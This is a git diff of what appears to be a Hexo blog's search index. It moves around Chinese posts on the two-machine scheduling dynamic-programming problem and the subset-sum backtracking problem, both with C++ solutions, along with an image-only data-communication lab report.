class="number">-1</span>] ;</span><br><span class="line">				<span class="keyword">if</span>( j - b[k<span class="number">-1</span>] &gt;= <span class="number">0</span> ) p[i][j][k] = p[i][j][k] || p[i][j-b[k<span class="number">-1</span>]][k<span class="number">-1</span>] ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> opt = mn ;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> j= <span class="number">0</span> ; j &lt;= mn ; j++ )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>( p[i][j][n] )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = <span class="built_in">max</span>( i , j ) ;</span><br><span class="line">				<span class="keyword">if</span>( tmp &lt; opt ) opt = tmp ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ofstream outfile ;</span><br><span class="line">	outfile.<span class="built_in">open</span>( <span class="string">&quot;output.txt&quot;</span> ) ;</span><br><span class="line">	outfile &lt;&lt; opt &lt;&lt; endl ;</span><br><span class="line"> 	outfile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">read</span>() ;</span><br><span class="line">	<span class="built_in">dyna</span>() ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述算法的时间复杂度为<code>O(m2n3) </code></p>
-]]></content>
-      <categories>
-        <category>Algorithm</category>
-      </categories>
-      <tags>
-        <tag>Dynamic programming</tag>
       </tags>
   </entry>
   <entry>
@@ -1283,6 +1250,104 @@
       </categories>
       <tags>
         <tag>computer</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>动态规划算法——双机调度问题</title>
+    <url>/2021/04/05/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%8C%E6%9C%BA%E8%B0%83%E5%BA%A6%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述:"></a>问题描述:</h3><p>用2台处理机<code>A</code>和<code>B</code>处理<code>n</code>个作业。设第<code>i</code>个作业交给机器A处理时需要时间<code>ai</code>，若由机器<code>B</code>来处理,则需要时间bi。</p>
+<p>由于各作业的特点和机器的性能关系，很可能对于某些<code>i</code>，有<code>ai ≥ bi</code>，而对于某些<code>j ≠ i</code>，有<code>aj &lt; bj</code>。既不能将一个作业分开由2台机器处理，也没有一台机器能同时处理2个作业。</p>
+<p>研究一个实例:</p>
+<p><code>(a1, a2, a3, a4, a5, a6) = (2, 5, 7, 10, 5, 2)</code></p>
+<p><code>(b1, b2, b3, b4, b5, b6) = (3, 8, 4, 11, 3, 4)</code></p>
+<h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计:"></a>算法设计:</h3><p>对于给定的n个作业，找出一个最优调度方案，使<code>A</code>、<code>B</code>两台机器处理完这n个作业的时间最短。</p>
+<h3 id="数据输入"><a href="#数据输入" class="headerlink" title="数据输入:"></a>数据输入:</h3><p>由文件<code>input. txt</code>提供输入数据。</p>
+<p>文件的第1行是1个正整数<code>n</code>,表示要处理<code>n</code>个作业</p>
+<p>在接下来的2行中,每行有n个正整数，分别表示处理机<code>A</code>和<code>B</code>处理第<code>i</code>个作业需要的处理时间。</p>
+<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出:"></a>结果输出:</h3><p>将计算出的最短处理时间输出到文件<code>output txt</code>。</p>
+<ul>
+<li><p>输入文件示例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.txt</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">2 5 7 10 5 2</span><br><span class="line">3 8 4 11 3 4</span><br></pre></td></tr></table></figure></li>
+<li><p>输出文件示例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output.txt</span><br><span class="line"></span><br><span class="line">15</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><ul>
+<li>找出<code>n</code>个任务所有耗时中最大的数<code>m</code>，也就是<code>A</code>和<code>B</code>数组的最大值。</li>
+<li>设置三维布尔量数组<code>p[mn][mn][n]</code>，布尔量<code>p[i][j][k]</code>表示前<code>k</code>个作业可以在处理机<code>A</code>用时不超过<code>i</code>，处理机B不超过<code>j</code>的时间内完成。动态规划算法：<code>p[i][j][k] = p[i-ak][j][k-1] | p[i][j-bk][k-1]</code>（<code>|</code>为按位与运算符）</li>
+<li>由上一步所得的结果我们可以找到时间最短的答案，具体是遍历布尔量为1的<code>k = n</code>的数组，取<code>min(i, j)</code>，如果比前一个小则取这个</li>
+<li>具体算法如下</li>
+</ul>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ifstream infile ;</span><br><span class="line">	infile.<span class="built_in">open</span>( <span class="string">&quot;input.txt&quot;</span> ) ;</span><br><span class="line">	infile &gt;&gt; n ;</span><br><span class="line">	</span><br><span class="line">	a = <span class="keyword">new</span> <span class="keyword">int</span>[n] ;</span><br><span class="line">	b = <span class="keyword">new</span> <span class="keyword">int</span>[n] ;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		infile &gt;&gt; a[i] ;</span><br><span class="line">		m = <span class="built_in">max</span>( a[i] , m ) ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		infile &gt;&gt; b[i] ;</span><br><span class="line">		m = <span class="built_in">max</span>( b[i] , m ) ;</span><br><span class="line">	&#125;</span><br><span class="line">	mn = m * n ;</span><br><span class="line">	</span><br><span class="line">	infile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dyna</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span>*** p = <span class="keyword">new</span> <span class="keyword">bool</span>** [mn+<span class="number">1</span>] ;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		p[i] = <span class="keyword">new</span> <span class="keyword">bool</span>* [mn+<span class="number">1</span>] ;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> j = <span class="number">0</span> ; j &lt;= mn ; j++ )</span><br><span class="line">		&#123;</span><br><span class="line">			p[i][j] = <span class="keyword">new</span> <span class="keyword">bool</span> [n+<span class="number">1</span>] ;</span><br><span class="line">			p[i][j][<span class="number">0</span>] = <span class="literal">true</span> ;</span><br><span class="line">			<span class="keyword">for</span>( <span class="keyword">int</span> k = <span class="number">1</span> ; k &lt;= n ; k ++ )</span><br><span class="line">			&#123;</span><br><span class="line">				p[i][j][k] = <span class="literal">false</span> ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> k = <span class="number">1</span> ; k &lt;= n ; k ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>( <span class="keyword">int</span> j = <span class="number">0</span> ; j &lt;= mn ; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( i - a[k<span class="number">-1</span>] &gt;= <span class="number">0</span> ) p[i][j][k] = p[i-a[k<span class="number">-1</span>]][j][k<span class="number">-1</span>] ;</span><br><span class="line">				<span class="keyword">if</span>( j - b[k<span class="number">-1</span>] &gt;= <span class="number">0</span> ) p[i][j][k] = p[i][j][k] || p[i][j-b[k<span class="number">-1</span>]][k<span class="number">-1</span>] ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> opt = mn ;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> j= <span class="number">0</span> ; j &lt;= mn ; j++ )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>( p[i][j][n] )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = <span class="built_in">max</span>( i , j ) ;</span><br><span class="line">				<span class="keyword">if</span>( tmp &lt; opt ) opt = tmp ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ofstream outfile ;</span><br><span class="line">	outfile.<span class="built_in">open</span>( <span class="string">&quot;output.txt&quot;</span> ) ;</span><br><span class="line">	outfile &lt;&lt; opt &lt;&lt; endl ;</span><br><span class="line"> 	outfile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">read</span>() ;</span><br><span class="line">	<span class="built_in">dyna</span>() ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述算法的时间复杂度为<code>O(m2n3) </code></p>
+]]></content>
+      <categories>
+        <category>Algorithm</category>
+      </categories>
+      <tags>
+        <tag>Dynamic programming</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>回溯法——子集和问题</title>
+    <url>/2021/04/24/%E5%9B%9E%E6%BA%AF%E6%B3%95%E2%80%94%E2%80%94%E5%AD%90%E9%9B%86%E5%92%8C%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="子集和问题"><a href="#子集和问题" class="headerlink" title="子集和问题"></a>子集和问题</h1><h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><p>子集和问题的一个实例为<code>&lt;S,t&gt;</code>。</p>
+<p>其中，<code>S=&#123;s1,x2,...,xn&#125;</code>是一个正整数的集合，c是一个正整数。</p>
+<p>子集和问题判定是否存在S的一个子集<code>S1</code>，使得集合中所有元素的和等于c。</p>
+<p>试设计一个解子集和问题的回溯法。</p>
+<h2 id="算法设计："><a href="#算法设计：" class="headerlink" title="算法设计："></a>算法设计：</h2><p>对于给定的正整数集合<code>S=&#123;s1,x2,...,xn&#125;</code>和正整数c，计算S的一个子集，使得子集和为c</p>
+<h2 id="数据输入："><a href="#数据输入：" class="headerlink" title="数据输入："></a>数据输入：</h2><p>由文件<code>input.txt</code>提供输入数据。</p>
+<p>文件第1行有2个整数n和c，n表示S的大小，c是子集和的目标值。</p>
+<p>接下来的1行中，有n个正整数，表示集合S中的元素。</p>
+<h2 id="结果输出："><a href="#结果输出：" class="headerlink" title="结果输出："></a>结果输出：</h2><p>将子集和问题的解输出到文件<code>output.txt</code>。</p>
+<p>当问题无解时，输出“No Solution！”。</p>
+<ul>
+<li>输入文件示例</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.txt</span><br><span class="line">5 10</span><br><span class="line">2 2 6 5 4</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>输出文件示例</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output.txt</span><br><span class="line">2 2 6</span><br></pre></td></tr></table></figure>
+
+<h2 id="算法思路："><a href="#算法思路：" class="headerlink" title="算法思路："></a>算法思路：</h2><ul>
+<li>回溯法的步骤为：<ul>
+<li>修改当前节点状态</li>
+<li>递归子节点状态</li>
+<li>回改当前节点状态</li>
+</ul>
+</li>
+<li><code>backtracking</code>函数：<ul>
+<li>我们将<code>value</code>的值加上当前节点的值，同时添加当前元素到<code>tem</code>数组里。</li>
+<li>递归下一节点，<code>backtracking(i + 1, n, c, S, tem, answer, value);</code></li>
+<li>弹出<code>tem</code>数组刚刚添加的元素，<code>value</code>减去刚才加上的值</li>
+<li>如果<code>value</code>值等于<code>c</code>，那么就添加此时的<code>tem</code>数组到<code>answer</code>二维数组中</li>
+</ul>
+</li>
+<li><code>ssumc</code>函数：<ul>
+<li>如果<code>answer</code>二维数组为空，则返回<code>tem</code>数组</li>
+<li>如果<code>answer</code>不为空，则返回<code>answer</code>数组的第一个元素</li>
+</ul>
+</li>
+<li><code>main</code>函数：<ul>
+<li>从文件输入n、c、S数组</li>
+<li>数组<code>ans</code>等于函数<code>ssumc</code>函数的返回值</li>
+<li>输出数组元素，如果为空，则输出“No Solution！”到文件中</li>
+</ul>
+</li>
+</ul>
+<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std ;</span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">ofstream <span class="title">outfile</span><span class="params">(<span class="string">&quot;outfile.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> &amp;n, <span class="keyword">int</span> &amp;c, vector&lt;<span class="keyword">int</span>&gt; S, vector&lt;<span class="keyword">int</span>&gt; &amp;tem,  vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; &amp;answer, <span class="keyword">int</span> value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">ssumc</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> c, vector&lt;<span class="keyword">int</span>&gt; S)</span> </span>&#123;</span><br><span class="line">	vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; answer;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; tem;</span><br><span class="line">	<span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">backtracking</span>(i, n, c, S, tem, answer, value);</span><br><span class="line">	<span class="keyword">if</span> (!answer.<span class="built_in">empty</span>())</span><br><span class="line">		<span class="keyword">return</span> answer[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> tem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> &amp;n, <span class="keyword">int</span> &amp;c, vector&lt;<span class="keyword">int</span>&gt; S, vector&lt;<span class="keyword">int</span>&gt; &amp;tem, vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; &amp;answer, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (value == c) &#123;</span><br><span class="line">		answer.<span class="built_in">push_back</span>(tem);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = pos; i &lt; n; i++) &#123;</span><br><span class="line">		tem.<span class="built_in">push_back</span>(S[i]);</span><br><span class="line">		value += S[i];</span><br><span class="line"></span><br><span class="line">		<span class="built_in">backtracking</span>(i + <span class="number">1</span>, n, c, S, tem, answer, value);</span><br><span class="line"></span><br><span class="line">		tem.<span class="built_in">pop_back</span>();</span><br><span class="line">		value -= S[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; S;</span><br><span class="line">	<span class="keyword">int</span> n, c;</span><br><span class="line">	infile &gt;&gt; n &gt;&gt; c;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> tem;</span><br><span class="line">		infile &gt;&gt; tem;</span><br><span class="line">		S.<span class="built_in">push_back</span>(tem);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; ans = <span class="built_in">ssumc</span>(n, c, S);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> it = ans.<span class="built_in">begin</span>(); it != ans.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		outfile &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ans.<span class="built_in">empty</span>())</span><br><span class="line">		outfile &lt;&lt; <span class="string">&quot;No Soution!&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>顾名思义，回溯法的核心是回溯。</p>
+<p>在搜索到某一节点的时候，如果我们发现目前的节点（及其子节点）并不是需求目标时，我们回退到原来的节点继续搜索，并且把在目前节点修改的状态还原。</p>
+<p>这样的好处是我们可以始终只对图的总状态进行修改，而非每次遍历时新建一个图来储存状态。</p>
+]]></content>
+      <categories>
+        <category>Algorithm</category>
+      </categories>
+      <tags>
+        <tag>回溯算法</tag>
       </tags>
   </entry>
   <entry>
@@ -1679,65 +1744,17 @@
       </tags>
   </entry>
   <entry>
-    <title>回溯法——子集和问题</title>
-    <url>/2021/04/24/%E5%9B%9E%E6%BA%AF%E6%B3%95%E2%80%94%E2%80%94%E5%AD%90%E9%9B%86%E5%92%8C%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="子集和问题"><a href="#子集和问题" class="headerlink" title="子集和问题"></a>子集和问题</h1><h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><p>子集和问题的一个实例为<code>&lt;S,t&gt;</code>。</p>
-<p>其中，<code>S=&#123;s1,x2,...,xn&#125;</code>是一个正整数的集合，c是一个正整数。</p>
-<p>子集和问题判定是否存在S的一个子集<code>S1</code>，使得集合中所有元素的和等于c。</p>
-<p>试设计一个解子集和问题的回溯法。</p>
-<h2 id="算法设计："><a href="#算法设计：" class="headerlink" title="算法设计："></a>算法设计：</h2><p>对于给定的正整数集合<code>S=&#123;s1,x2,...,xn&#125;</code>和正整数c，计算S的一个子集，使得子集和为c</p>
-<h2 id="数据输入："><a href="#数据输入：" class="headerlink" title="数据输入："></a>数据输入：</h2><p>由文件<code>input.txt</code>提供输入数据。</p>
-<p>文件第1行有2个整数n和c，n表示S的大小，c是子集和的目标值。</p>
-<p>接下来的1行中，有n个正整数，表示集合S中的元素。</p>
-<h2 id="结果输出："><a href="#结果输出：" class="headerlink" title="结果输出："></a>结果输出：</h2><p>将子集和问题的解输出到文件<code>output.txt</code>。</p>
-<p>当问题无解时，输出“No Solution！”。</p>
-<ul>
-<li>输入文件示例</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.txt</span><br><span class="line">5 10</span><br><span class="line">2 2 6 5 4</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>输出文件示例</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output.txt</span><br><span class="line">2 2 6</span><br></pre></td></tr></table></figure>
-
-<h2 id="算法思路："><a href="#算法思路：" class="headerlink" title="算法思路："></a>算法思路：</h2><ul>
-<li>回溯法的步骤为：<ul>
-<li>修改当前节点状态</li>
-<li>递归子节点状态</li>
-<li>回改当前节点状态</li>
-</ul>
-</li>
-<li><code>backtracking</code>函数：<ul>
-<li>我们将<code>value</code>的值加上当前节点的值，同时添加当前元素到<code>tem</code>数组里。</li>
-<li>递归下一节点，<code>backtracking(i + 1, n, c, S, tem, answer, value);</code></li>
-<li>弹出<code>tem</code>数组刚刚添加的元素，<code>value</code>减去刚才加上的值</li>
-<li>如果<code>value</code>值等于<code>c</code>，那么就添加此时的<code>tem</code>数组到<code>answer</code>二维数组中</li>
-</ul>
-</li>
-<li><code>ssumc</code>函数：<ul>
-<li>如果<code>answer</code>二维数组为空，则返回<code>tem</code>数组</li>
-<li>如果<code>answer</code>不为空，则返回<code>answer</code>数组的第一个元素</li>
-</ul>
-</li>
-<li><code>main</code>函数：<ul>
-<li>从文件输入n、c、S数组</li>
-<li>数组<code>ans</code>等于函数<code>ssumc</code>函数的返回值</li>
-<li>输出数组元素，如果为空，则输出“No Solution！”到文件中</li>
-</ul>
-</li>
-</ul>
-<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std ;</span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">ofstream <span class="title">outfile</span><span class="params">(<span class="string">&quot;outfile.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> &amp;n, <span class="keyword">int</span> &amp;c, vector&lt;<span class="keyword">int</span>&gt; S, vector&lt;<span class="keyword">int</span>&gt; &amp;tem,  vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; &amp;answer, <span class="keyword">int</span> value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">ssumc</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> c, vector&lt;<span class="keyword">int</span>&gt; S)</span> </span>&#123;</span><br><span class="line">	vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; answer;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; tem;</span><br><span class="line">	<span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">backtracking</span>(i, n, c, S, tem, answer, value);</span><br><span class="line">	<span class="keyword">if</span> (!answer.<span class="built_in">empty</span>())</span><br><span class="line">		<span class="keyword">return</span> answer[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> tem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> &amp;n, <span class="keyword">int</span> &amp;c, vector&lt;<span class="keyword">int</span>&gt; S, vector&lt;<span class="keyword">int</span>&gt; &amp;tem, vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; &amp;answer, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (value == c) &#123;</span><br><span class="line">		answer.<span class="built_in">push_back</span>(tem);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = pos; i &lt; n; i++) &#123;</span><br><span class="line">		tem.<span class="built_in">push_back</span>(S[i]);</span><br><span class="line">		value += S[i];</span><br><span class="line"></span><br><span class="line">		<span class="built_in">backtracking</span>(i + <span class="number">1</span>, n, c, S, tem, answer, value);</span><br><span class="line"></span><br><span class="line">		tem.<span class="built_in">pop_back</span>();</span><br><span class="line">		value -= S[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; S;</span><br><span class="line">	<span class="keyword">int</span> n, c;</span><br><span class="line">	infile &gt;&gt; n &gt;&gt; c;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> tem;</span><br><span class="line">		infile &gt;&gt; tem;</span><br><span class="line">		S.<span class="built_in">push_back</span>(tem);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; ans = <span class="built_in">ssumc</span>(n, c, S);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> it = ans.<span class="built_in">begin</span>(); it != ans.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		outfile &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ans.<span class="built_in">empty</span>())</span><br><span class="line">		outfile &lt;&lt; <span class="string">&quot;No Soution!&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>顾名思义，回溯法的核心是回溯。</p>
-<p>在搜索到某一节点的时候，如果我们发现目前的节点（及其子节点）并不是需求目标时，我们回退到原来的节点继续搜索，并且把在目前节点修改的状态还原。</p>
-<p>这样的好处是我们可以始终只对图的总状态进行修改，而非每次遍历时新建一个图来储存状态。</p>
+    <title>数据通信实验报告</title>
+    <url>/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
+    <content><![CDATA[<h1 id="数据通信实验报告"><a href="#数据通信实验报告" class="headerlink" title="数据通信实验报告"></a>数据通信实验报告</h1><p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0001.jpg" alt="0001"></p>
+<p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0002.jpg" alt="0002"></p>
+<p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0003.jpg" alt="0003"></p>
 ]]></content>
       <categories>
-        <category>Algorithm</category>
+        <category>Others</category>
       </categories>
       <tags>
-        <tag>回溯算法</tag>
+        <tag>课程作业</tag>
       </tags>
   </entry>
   <entry>
@@ -2059,278 +2076,6 @@ php反序列化漏洞。
       </tags>
   </entry>
   <entry>
-    <title>数据通信实验报告</title>
-    <url>/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
-    <content><![CDATA[<h1 id="数据通信实验报告"><a href="#数据通信实验报告" class="headerlink" title="数据通信实验报告"></a>数据通信实验报告</h1><p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0001.jpg" alt="0001"></p>
-<p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0002.jpg" alt="0002"></p>
-<p><img src="/2021/05/06/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/0003.jpg" alt="0003"></p>
-]]></content>
-      <categories>
-        <category>Others</category>
-      </categories>
-      <tags>
-        <tag>课程作业</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深入理解计算机系统——课程作业2</title>
